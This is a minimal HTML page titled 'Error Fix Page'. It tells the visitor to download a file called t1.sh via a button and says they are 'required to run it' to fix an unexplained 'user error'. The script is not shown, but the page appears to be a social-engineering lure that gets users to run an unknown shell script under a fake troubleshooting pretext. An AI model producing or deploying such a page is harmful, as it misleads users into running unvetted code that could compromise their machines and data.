<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Error Fix Page</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            background-color: #f4f4f4;
            text-align: center;
            padding-top: 50px;
        }
        .message {
            font-size: 1.2rem;
            color: #333;
            margin-bottom: 20px;
        }
        .error-fix-button {
            background-color: #007BFF;
            color: white;
            padding: 10px 20px;
            border-radius: 5px;
            font-size: 1rem;
            border: none;
            cursor: pointer;
            transition: background-color 0.3s ease;
        }
        .error-fix-button:hover {
            background-color: #0056b3;
        }
    </style>
</head>
<body>

    <p class="message">To fix the user error click the button below to download the error fix file. Once the file is downloaded you are required to run it.</p>
    <button class="error-fix-button" onclick="location.href='t1.sh'" download> Error Fix File </button>

</body>
</html>
